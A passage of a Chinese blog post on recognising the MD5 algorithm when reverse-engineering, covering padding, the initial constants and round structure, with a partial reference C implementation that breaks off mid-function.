href="https://zhuanlan.zhihu.com/p/115270932#:~:text=C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%20%E4%BB%A5%E4%B8%8B%E4%BB%A3%E7%A0%81%E6%A0%B9%E6%8D%AE%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE%E4%BF%AE%E6%94%B9%E3%80%81%E6%B3%A8%E9%87%8A%E8%80%8C%E6%9D%A5%EF%BC%8C%E6%AF%95%E7%AB%9FMD5%E7%AE%97%E6%B3%95%E4%B8%8D%E6%98%AF%E6%88%91%E5%8E%9F%E5%88%9B%E7%9A%84%E3%80%82%20%2F%2A,%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E%EF%BC%9A%20%E5%85%88%E8%B0%83%E7%94%A8MD5Init%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%80%E4%B8%AAMD5_CTX%E7%B1%BB%E5%9E%8B%E7%BB%93%E6%9E%84%E4%BD%93%EF%BC%8C%E5%86%8D%E4%BD%BF%E7%94%A8MD5Update%E8%AE%A1%E7%AE%97MD5%E7%A0%81%EF%BC%8C%E6%9C%80%E5%90%8E%E8%B0%83%E7%94%A8MD5Final%E8%8E%B7%E5%8F%96%20%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B%E8%A7%81%E6%9C%80%E4%B8%8B%E9%9D%A2%E7%9A%84main%E5%87%BD%E6%95%B0%E3%80%82]">https://zhuanlan.zhihu.com/p/115270932#:~:text=C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%20%E4%BB%A5%E4%B8%8B%E4%BB%A3%E7%A0%81%E6%A0%B9%E6%8D%AE%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE%E4%BF%AE%E6%94%B9%E3%80%81%E6%B3%A8%E9%87%8A%E8%80%8C%E6%9D%A5%EF%BC%8C%E6%AF%95%E7%AB%9FMD5%E7%AE%97%E6%B3%95%E4%B8%8D%E6%98%AF%E6%88%91%E5%8E%9F%E5%88%9B%E7%9A%84%E3%80%82%20%2F%2A,%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E%EF%BC%9A%20%E5%85%88%E8%B0%83%E7%94%A8MD5Init%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%80%E4%B8%AAMD5_CTX%E7%B1%BB%E5%9E%8B%E7%BB%93%E6%9E%84%E4%BD%93%EF%BC%8C%E5%86%8D%E4%BD%BF%E7%94%A8MD5Update%E8%AE%A1%E7%AE%97MD5%E7%A0%81%EF%BC%8C%E6%9C%80%E5%90%8E%E8%B0%83%E7%94%A8MD5Final%E8%8E%B7%E5%8F%96%20%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B%E8%A7%81%E6%9C%80%E4%B8%8B%E9%9D%A2%E7%9A%84main%E5%87%BD%E6%95%B0%E3%80%82]</a>(<a href="https://zhuanlan.zhihu.com/p/115270932#:~:text=C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0">https://zhuanlan.zhihu.com/p/115270932#:~:text=C语言实现</a> 以下代码根据参考文献修改、注释而来，毕竟MD5算法不是我原创的。 %2F*,函数使用说明： 先调用MD5Init初始化一个MD5_CTX类型结构体，再使用MD5Update计算MD5码，最后调用MD5Final获取 使用示例见最下面的main函数。)</p><p>MD5加密的函数大致如下：</p><p>MD5_CTX md5c;（结构体）</p><p>MD5Init(&amp;md5c);</p><p>MD5UpdateString(&amp;md5c,plain)</p><p>MD5Final(digest,&amp;md5c);</p><h2 id="数据填充"><a href="#数据填充" class="headerlink" title="数据填充"></a>数据填充</h2><p>MD5算法的第二步“分组循环变换”是以<strong>512</strong>位为一个分组进行处理的。因此，需要把数据填充成长度为512位的倍数。具体填充步骤如下：</p><p>1、先填充一个“1”，后面加上k个“0”。其中k是满足(n+1+k) mod 512 &#x3D; 448的最小正整数。</p><p>2、追加64位的数据长度（bit为单位，小端序存放）</p><p>填充完的数据大概长这样：</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693970015957-e790cc21-69cd-4c27-82ec-04f5e2389777.png" class="" title="img"><h2 id="分组循环变换"><a href="#分组循环变换" class="headerlink" title="分组循环变换"></a>分组循环变换</h2><p>其中，MD5Init会初始化四个称作MD5链接变量的整形参数。因此如果看到这4个常数<code>0x67452301、0xefcdab89、0x98badcfe、0x10325476</code>，就应该是MD5算法了。MD5Init函数代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">void MD5Init(MD5_CTX *context)  <br>&#123;  <br>     context-&gt;count[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;  <br>     context-&gt;count[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;  <br>     //Load magic initialization constants<br>     context-&gt;state[<span class="hljs-number">0</span>] = <span class="hljs-number">0x67452301</span>;  <br>     context-&gt;state[<span class="hljs-number">1</span>] = <span class="hljs-number">0xEFCDAB89</span>;  <br>     context-&gt;state[<span class="hljs-number">2</span>] = <span class="hljs-number">0x98BADCFE</span>;  <br>     context-&gt;state[<span class="hljs-number">3</span>] = <span class="hljs-number">0x10325476</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>十进制表示如下，int最大是0x7fffffff，所以第2个和第3个为负数</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693966877726-70617850-e282-48d0-927a-83e303e32eb8.png" class="" title="img"><p>然后将填充完成后的数据划分成一个个512位的分组，依次进入循环变换。A、B、C、D也参与到循环变换中。数据分组进去变换的时候，大概走这么个流程：</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693970069070-387aab7f-cd39-4461-8e4a-c67f1cab217c.png" class="" title="img"><p>循环变换是整个MD5算法最核心，也是最复杂的部分。一个512位分组的数据被进一步划分为16个32位的子分组，对每个子分组进行下图所示的变换：</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693970143998-4b2596b3-2dcb-461a-a779-f18d47a34948.webp" class="" title="img"><p>上面只是画出了一个子分组进行的变换。下面对图中的元素进行说明：</p><p>1.图中的F函数代表一次由位运算构成的非线性变换，每一轮循环变换用到的F函数不一样</p><p>2.常数AC的值在每一次变换中都不一样</p><p>3.左移位数S有规律地周期性变化</p><p>数据的16个子分组都参与到上图所示的变换，顺序不定。当16个子分组处理完成时，我们就说完成了一轮循环变换。MD5的一个数据分组一共需要进行四轮的循环变换。将四轮循环变换后得到的A、B、C、D的值分别和原来的值相加，就是A、B、C、D进行循环变换后的结果</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693970353116-2a024378-53db-4237-b495-6291b8c10b6d.png" class="" title="img"><h2 id="拼接输出"><a href="#拼接输出" class="headerlink" title="拼接输出"></a>拼接输出</h2><p>将经过若干次循环变换后的A、B、C、D<strong>以十六进制的形式拼接起来</strong>，就是MD5码</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693970383717-bf407b4f-9917-4dbc-8818-8a0668643ea6.png" class="" title="img"><p>这里是加密函数，而且也能看到hash[]</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693465621018-8c8131a5-a32f-4e3b-9646-220b1bd2a96f.png" class="" title="img"><p>还有可能的特征</p><img src="/2025/01/09/Reverse%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/1693465549899-24101ab3-d128-48be-9379-159436b0563b.png" class="" title="img"><p>完整代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">函数使用说明：</span><br><span class="hljs-comment">先调用MD5Init初始化一个MD5_CTX类型结构体，再使用MD5Update计算MD5码，最后调用MD5Final获取</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *POINTER; <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> state[<span class="hljs-number">4</span>];                                   <span class="hljs-comment">/* A,B,C,D四个常数 */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count[<span class="hljs-number">2</span>];        <span class="hljs-comment">/* 数据的bit数计数器(对2^64取余) */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buffer[<span class="hljs-number">64</span>];                         <span class="hljs-comment">/* 输入数据缓冲区 */</span><br>&#125; MD5_CTX; <span class="hljs-comment">//存放MD5算法相关信息的结构体定义</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Init</span> <span class="hljs-params">(MD5_CTX *)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Update</span><span class="hljs-params">(MD5_CTX *, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Final</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> [<span class="hljs-number">16</span>], MD5_CTX *)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Transform</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> [<span class="hljs-number">4</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> [<span class="hljs-number">64</span>])</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Encode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Decode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-comment">//循环左移的位数</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S11 7</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S12 12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S13 17</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S14 22</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S21 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S22 9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S23 14</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S24 20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S31 4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S32 11</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S33 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S34 23</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S41 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S42 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S43 15</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S44 21</span><br><br><span class="hljs-comment">//数据填充的内容</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> PADDING[<span class="hljs-number">64</span>] = &#123;<br>    <span class="hljs-number">0x80</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>    &#125;;<br><br><span class="hljs-comment">//F,G,H,I四个非线性变换函数</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> F(x, y, z) (((x) &amp; (y)) | ((~x) &amp; (z)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> G(x, y, z) (((x) &amp; (z)) | ((y) &amp; (~z)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> H(x, y, z) ((x) ^ (y) ^ (z))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> I(x, y, z) ((y) ^ ((x) | (~z)))</span><br><br><span class="hljs-comment">//x循环左移n位的操作</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ROTATE_LEFT(x, n) (((x) <span class="hljs-string">&lt;&lt; (n)) | ((x) &gt;</span>&gt; (32-(n))))</span><br><br><span class="hljs-comment">//FF,GG,HH,II是四轮循环变换分别用到的变换函数</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FF(a, b, c, d, x, s, ac) &#123; \</span><br><span class="hljs-meta"> (a) += F ((b), (c), (d)) + (x) + (unsigned int)(ac); \</span><br><span class="hljs-meta"> (a) = ROTATE_LEFT ((a), (s)); \</span><br><span class="hljs-meta"> (a) += (b); \</span><br><span class="hljs-meta">  &#125;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GG(a, b, c, d, x, s, ac) &#123; \</span><br><span class="hljs-meta"> (a) += G ((b), (c), (d)) + (x) + (unsigned int)(ac); \</span><br><span class="hljs-meta"> (a) = ROTATE_LEFT ((a), (s)); \</span><br><span class="hljs-meta"> (a) += (b); \</span><br><span class="hljs-meta">  &#125;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HH(a, b, c, d, x, s, ac) &#123; \</span><br><span class="hljs-meta"> (a) += H ((b), (c), (d)) + (x) + (unsigned int)(ac); \</span><br><span class="hljs-meta"> (a) = ROTATE_LEFT ((a), (s)); \</span><br><span class="hljs-meta"> (a) += (b); \</span><br><span class="hljs-meta">  &#125;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> II(a, b, c, d, x, s, ac) &#123; \</span><br><span class="hljs-meta"> (a) += I ((b), (c), (d)) + (x) + (unsigned int)(ac); \</span><br><span class="hljs-meta"> (a) = ROTATE_LEFT ((a), (s)); \</span><br><span class="hljs-meta"> (a) += (b); \</span><br><span class="hljs-meta">  &#125;</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Init</span> <span class="hljs-params">(MD5_CTX *context)</span><br>&#123;<br>    <span class="hljs-comment">//bit计数器清零</span><br>    context-&gt;count[<span class="hljs-number">0</span>] = context-&gt;count[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//A,B,C,D被初始化为四个特定的常数(Magic Number)</span><br>    context-&gt;state[<span class="hljs-number">0</span>] = <span class="hljs-number">0x67452301</span>;<br>    context-&gt;state[<span class="hljs-number">1</span>] = <span class="hljs-number">0xefcdab89</span>;<br>    context-&gt;state[<span class="hljs-number">2</span>] = <span class="hljs-number">0x98badcfe</span>;<br>    context-&gt;state[<span class="hljs-number">3</span>] = <span class="hljs-number">0x10325476</span>;<br>&#125;<br><br><span class="hljs-comment">//使用MD5算法对input的数据进行处理</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Update</span> <span class="hljs-params">(MD5_CTX *context, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *input, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inputLen)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, index, partLen;<br>    <span class="hljs-comment">//计算[已处理数据长度(byte) mod 64]</span><br>    index = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((context-&gt;count[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x3F</span>);<br>    <span class="hljs-comment">//bit计数器累加</span><br>    <span class="hljs-keyword">if</span> ((context-&gt;count[<span class="hljs-number">0</span>] += ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)inputLen &lt;&lt; <span class="hljs-number">3</span>))<br>      &lt; ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)inputLen &lt;&lt; <span class="hljs-number">3</span>)) <span class="hljs-comment">//处理加法进位溢出的情况</span><br>        context-&gt;count[<span class="hljs-number">1</span>]++;<br>    context-&gt;count[<span class="hljs-number">1</span>] += ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)inputLen &gt;&gt; <span class="hljs-number">29</span>);<br>    <span class="hljs-comment">//计算缓冲区还有多少字节空间</span><br>    partLen = <span class="hljs-number">64</span> - index;<br>    <span class="hljs-comment">//以512位数据为一组进行处理</span><br>    <span class="hljs-keyword">if</span> (inputLen &gt;= partLen) &#123;<br>        <span class="hljs-built_in">memcpy</span>(&amp;context-&gt;buffer[index],input, partLen);<br>        MD5Transform (context-&gt;state, context-&gt;buffer);<br>        <span class="hljs-keyword">for</span> (i = partLen; i + <span class="hljs-number">63</span> &lt; inputLen; i += <span class="hljs-number">64</span>)<br>            MD5Transform (context-&gt;state, &amp;input[i]);<br>        index = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//缓存未处理的输入</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;context-&gt;buffer[index],&amp;input[i],inputLen-i);<br>&#125;<br><br><span class="hljs-comment">//获取MD5码（由digest返回），顺便清除context数据</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Final</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> digest[<span class="hljs-number">16</span>], MD5_CTX *context)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> bits[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index, padLen;<br>    <span class="hljs-comment">//记录数据长度</span><br>    Encode (bits, context-&gt;count, <span class="hljs-number">8</span>);<br>    <span class="hljs-comment">//填充数据</span><br>    index = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((context-&gt;count[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x3f</span>);<br>    padLen = (index &lt; <span class="hljs-number">56</span>) ? (<span class="hljs-number">56</span> - index) : (<span class="hljs-number">120</span> - index);<br>    MD5Update (context, PADDING, padLen);<br>    <span class="hljs-comment">//追加数据长度信息</span><br>    MD5Update (context, bits, <span class="hljs-number">8</span>);<br>    <span class="hljs-comment">//获取MD5码。其实就是将ABCD四个32位整数以16进制方式级联</span><br>    Encode (digest, context-&gt;state, <span class="hljs-number">16</span>);<br>    <span class="hljs-comment">//清除数据</span><br>    <span class="hljs-built_in">memset</span>(context, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*context));<br>&#125;<br><br><span class="hljs-comment">//MD5变换函数</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">MD5Transform</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> state[<span class="hljs-number">4</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> block[<span class="hljs-number">64</span>])</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a = state[<span class="hljs-number">0</span>], b = state[<span class="hljs-number">1</span>], c = state[<span class="hljs-number">2</span>], d = state[<span class="hljs-number">3</span>], x[<span class="hljs-number">16</span>];<br>    <span class="hljs-comment">//将64字节的一组数据进一步划分为16个子分组</span><br>    Decode (x, block, <span class="hljs-number">64</span>);<br>    <span class="hljs-comment">//第1轮循环变换</span><br>    FF (a, b, c, d, x[ <span class="hljs-number">0</span>], S11, <span class="hljs-number">0xd76aa478</span>); <span class="hljs-comment">/* 1 */</span><br>    FF (d, a, b, c, x[ <span class="hljs-number">1</span>], S12, <span class="hljs-number">0xe8c7b756</span>); <span class="hljs-comment">/* 2 */</span><br>    FF (c, d, a, b, x[ <span class="hljs-number">2</span>], S13, <span class="hljs-number">0x242070db</span>); <span class="hljs-comment">/* 3 */</span><br>    FF (b, c, d, a, x[ <span class="hljs-number">3</span>], S14, <span class="hljs-number">0xc1bdceee</span>); <span class="hljs-comment">/* 4 */</span><br>    FF (a, b, c, d, x[ <span class="hljs-number">4</span>], S11, <span class="hljs-number">0xf57c0faf</span>); <span class="hljs-comment">/* 5 */</span><br>    FF (d, a, b, c, x[ <span class="hljs-number">5</span>], S12, <span class="hljs-number">0x4787c62a</span>); <span class="hljs-comment">/* 6 */</span><br>    FF (c, d, a, b, x[ <span class="hljs-number">6</span>], S13, <span class="hljs-number">0xa8304613</span>); <span class="hljs-comment">/* 7 */</span><br>    FF (b, c, d, a, x[ <span class="hljs-number">7</span>], S14, <span class="hljs-number">0xfd469501</span>); <span class="hljs-comment">/* 8 */</span><br>    FF (a, b, c, d, x[ <span class="hljs-number">8</span>], S11, <span class="hljs-number">0x698098d8</span>); <span class="hljs-comment">/* 9 */</span><br>    FF (d, a, b, c, x[ <span class="hljs-number">9</span>], S12, <span class="hljs-number">0x8b44f7af</span>); <span class="hljs-comment">/* 10 */</span><br>    FF (c, d, a, b, x[<span class="hljs-number">10</span>], S13, <span class="hljs-number">0xffff5bb1</span>); <span class="hljs-comment">/* 11 */</span><br>    FF (b, c, d, a, x[<span class="hljs-number">11</span>], S14, <span class="hljs-number">0x895cd7be</span>); <span class="hljs-comment">/* 12 */</span><br>    FF (a, b, c, d, x[<span class="hljs-number">12</span>], S11, <span class="hljs-number">0x6b901122</span>); <span class="hljs-comment">/* 13 */</span><br>    FF (d, a, b, c, x[<span class="hljs-number">13</span>], S12, <span class="hljs-number">0xfd987193</span>); <span class="hljs-comment">/* 14 */</span><br>    FF (c, d, a, b, x[<span class="hljs-number">14</span>], S13, <span class="hljs-number">0xa679438e</span>); <span class="hljs-comment">/* 15 */</span><br>    FF (b, c, d, a, x[<span class="hljs-number">15</span>], S14, <span class="hljs-number">0x49b40821</span>); <span class="hljs-comment">/* 16 */</span><br>    <span 